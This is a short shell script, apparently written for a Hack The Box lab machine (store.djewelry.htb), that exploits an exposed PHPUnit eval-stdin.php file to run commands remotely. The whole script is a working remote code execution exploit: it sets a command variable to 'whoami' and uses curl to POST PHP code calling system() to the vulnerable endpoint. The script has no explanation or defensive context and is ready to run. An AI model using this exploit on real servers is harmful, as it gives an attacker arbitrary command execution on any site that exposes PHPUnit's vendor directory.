CMD="whoami"

curl  -s \
      http://store.djewelry.htb/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php \
      --data "<?php system(\"$CMD\") ?>"
